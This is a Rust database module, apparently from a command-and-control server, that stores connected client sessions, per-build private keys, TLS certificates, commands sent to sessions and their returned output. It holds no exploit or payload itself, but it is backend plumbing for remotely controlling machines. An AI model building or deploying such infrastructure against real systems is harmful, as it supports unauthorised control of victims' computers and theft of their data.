// ... imports ...
use rusqlite::{Connection, params, OptionalExtension};
use std::sync::{Arc, Mutex};
use chrono::Utc;

pub type DbRef = Arc<Mutex<Connection>>;

pub struct FullLogEntry {
    pub session_id: u32,
    pub request_id: u64,
    pub command: String,
    pub output: Option<String>,
    pub error: Option<String>,
    pub timestamp: String,
}

pub fn init() -> Result<Connection, Box<dyn std::error::Error>> {
    let conn = Connection::open("c2_audit.db")?;
    
    conn.execute_batch(
        "PRAGMA journal_mode = WAL;
         
         CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY,
            session_uuid TEXT, exe_id TEXT, computer_id TEXT, 
            hostname TEXT, os TEXT, ip_address TEXT, build_id TEXT, connected_at TEXT,
            is_active INTEGER DEFAULT 0  -- [NEW] Column
        );

        CREATE TABLE IF NOT EXISTS server_config (
            key TEXT PRIMARY KEY,
            value BLOB
        );

        CREATE TABLE IF NOT EXISTS build_keys (
            build_id TEXT PRIMARY KEY,
            private_key BLOB
        );

        CREATE TABLE IF NOT EXISTS client_outputs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id INTEGER,
            request_id INTEGER,
            output TEXT,
            error TEXT,
            timestamp TEXT,
            FOREIGN KEY(session_id) REFERENCES sessions(id)
        );

        CREATE TABLE IF NOT EXISTS command_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id INTEGER,
            request_id INTEGER,
            command TEXT,
            timestamp TEXT,
            FOREIGN KEY(session_id) REFERENCES sessions(id)
        );

        CREATE INDEX IF NOT EXISTS idx_outputs_req ON client_outputs(request_id);
        CREATE INDEX IF NOT EXISTS idx_cmd_req ON command_history(request_id);
        CREATE INDEX IF NOT EXISTS idx_outputs_timestamp ON client_outputs(timestamp);"
    )?;

    Ok(conn)
}

// ... (Keep load_or_import_certs and get_build_key unchanged) ...
pub fn load_or_import_certs(conn: &Connection) -> Result<(Vec<u8>, Vec<u8>, Vec<u8>), Box<dyn std::error::Error>> {
    // Try to load from DB
    let cert_blob: Option<Vec<u8>> = conn.query_row(
        "SELECT value FROM server_config WHERE key='server_cert'", [], |row| row.get(0)
    ).optional()?;

    if let Some(c) = cert_blob {
        println!("[+] Loading TLS certificates from SQLite...");
        let k: Vec<u8> = conn.query_row("SELECT value FROM server_config WHERE key='server_key'", [], |row| row.get(0))?;
        let ca: Vec<u8> = conn.query_row("SELECT value FROM server_config WHERE key='ca_cert'", [], |row| row.get(0))?;
        Ok((c, k, ca))
    } else {
        println!("[!] Importing TLS certificates from 'certs/' to SQLite...");
        // Ensure 'certs/' directory exists with these files
        let c = std::fs::read("certs/server.crt")?;
        let k = std::fs::read("certs/server.key.der")?;
        let ca = std::fs::read("certs/ca.crt")?;
        
        conn.execute("INSERT OR REPLACE INTO server_config (key, value) VALUES (?1, ?2)", params!["server_cert", &c])?;
        conn.execute("INSERT OR REPLACE INTO server_config (key, value) VALUES (?1, ?2)", params!["server_key", &k])?;
        conn.execute("INSERT OR REPLACE INTO server_config (key, value) VALUES (?1, ?2)", params!["ca_cert", &ca])?;
        Ok((c, k, ca))
    }
}

pub fn get_build_key(conn: &Connection, build_id: &str) -> Option<Vec<u8>> {
    conn.query_row(
        "SELECT private_key FROM build_keys WHERE build_id = ?", 
        [build_id], |r| r.get(0)
    ).optional().unwrap_or(None)
}

pub fn log_new_session(
    conn: &Connection, 
    exe_id: &str, 
    computer_id: &str, 
    hostname: &str, 
    os: &str, 
    ip: &str, 
    build_id: &str
) {
    // [NEW] Ensure is_active is reset to 0 on new connection
    let _ = conn.execute(
        "INSERT INTO sessions (exe_id, computer_id, hostname, os, ip_address, build_id, connected_at, is_active) 
         VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, 0)",
        params![exe_id, computer_id, hostname, os, ip, build_id, Utc::now().to_rfc3339()]
    );
}

// [NEW] Helper to toggle active state
pub fn set_session_active(conn: &Connection, session_id: u32, active: bool) {
    let val = if active { 1 } else { 0 };
    let _ = conn.execute(
        "UPDATE sessions SET is_active = ?1 WHERE id = ?2",
        params![val, session_id]
    );
}

// [NEW] Helper to get active state
pub fn is_session_active(conn: &Connection, session_id: u32) -> bool {
    conn.query_row(
        "SELECT is_active FROM sessions WHERE id = ?1",
        params![session_id],
        |row| {
            let val: i32 = row.get(0)?;
            Ok(val == 1)
        }
    ).unwrap_or(false)
}

// ... (Keep log_command, save_client_output, enforce_storage_limit, and history functions unchanged) ...
pub fn log_command(conn: &Connection, session_id: u32, request_id: u64, command: &str) {
    let _ = conn.execute(
        "INSERT INTO command_history (session_id, request_id, command, timestamp) VALUES (?1, ?2, ?3, ?4)",
        params![session_id, request_id as i64, command, Utc::now().to_rfc3339()]
    );
}

const MAX_STORAGE_BYTES: usize = 150 * 1024 * 1024; // 150 MB
const MAX_CHAR_LIMIT: usize = 3000;

pub fn save_client_output(conn: &Connection, session_id: u32, request_id: u64, output: &str, error: &str) {
    let safe_output: String = output.chars().take(MAX_CHAR_LIMIT).collect();
    let safe_error: String = error.chars().take(MAX_CHAR_LIMIT).collect();

    let res = conn.execute(
        "INSERT INTO client_outputs (session_id, request_id, output, error, timestamp) VALUES (?1, ?2, ?3, ?4, ?5)",
        params![session_id, request_id as i64, safe_output, safe_error, Utc::now().to_rfc3339()]
    );

    if let Err(e) = res {
        eprintln!("[-] DB Insert Error: {}", e);
        return;
    }

    if let Err(e) = enforce_storage_limit(conn) {
        eprintln!("[-] DB Cleanup Error: {}", e);
    }
}

fn enforce_storage_limit(conn: &Connection) -> Result<(), rusqlite::Error> {
    let current_size: i64 = conn.query_row(
        "SELECT COALESCE(SUM(LENGTH(output) + LENGTH(error)), 0) FROM client_outputs",
        [],
        |row| row.get(0)
    )?;

    if (current_size as usize) > MAX_STORAGE_BYTES {
        println!("[!] DB Limit (150MB) reached. Pruning old logs...");
        
        let mut freed = 0;
        while freed < ((current_size as usize) - MAX_STORAGE_BYTES) + (1024 * 1024) { 
             let deleted_count = conn.execute(
                "DELETE FROM client_outputs WHERE id IN (SELECT id FROM client_outputs ORDER BY timestamp ASC LIMIT 50)",
                []
            )?;
            
            if deleted_count == 0 { break; } 
            freed += deleted_count * MAX_CHAR_LIMIT; 
        }
    }
    Ok(())
}

pub fn get_global_full_history(conn: &Connection, limit: usize) -> Result<Vec<FullLogEntry>, rusqlite::Error> {
    let mut stmt = conn.prepare(
        "SELECT 
            ch.session_id, 
            ch.request_id, 
            ch.command, 
            co.output, 
            co.error, 
            ch.timestamp 
         FROM command_history ch
         LEFT JOIN client_outputs co ON ch.session_id = co.session_id AND ch.request_id = co.request_id
         ORDER BY ch.timestamp DESC 
         LIMIT ?1"
    )?;

    let rows = stmt.query_map([limit as i64], |row| {
        Ok(FullLogEntry {
            session_id: row.get(0)?,
            request_id: row.get::<_, i64>(1)? as u64,
            command: row.get(2)?,
            output: row.get(3)?,
            error: row.get(4)?,
            timestamp: row.get(5)?,
        })
    })?;

    let mut history = Vec::new();
    for row in rows { history.push(row?); }
    Ok(history)
}

pub fn get_session_full_history(conn: &Connection, session_id: u32, limit: usize) -> Result<Vec<FullLogEntry>, rusqlite::Error> {
    let mut stmt = conn.prepare(
        "SELECT 
            ch.session_id, 
            ch.request_id, 
            ch.command, 
            co.output, 
            co.error, 
            ch.timestamp 
         FROM command_history ch
         LEFT JOIN client_outputs co ON ch.session_id = co.session_id AND ch.request_id = co.request_id
         WHERE ch.session_id = ?1
         ORDER BY ch.timestamp DESC 
         LIMIT ?2"
    )?;

    let rows = stmt.query_map(params![session_id, limit as i64], |row| {
        Ok(FullLogEntry {
            session_id: row.get(0)?,
            request_id: row.get::<_, i64>(1)? as u64,
            command: row.get(2)?,
            output: row.get(3)?,
            error: row.get(4)?,
            timestamp: row.get(5)?,
        })
    })?;

    let mut history = Vec::new();
    for row in rows { history.push(row?); }
    
    history.reverse();
    Ok(history)
}
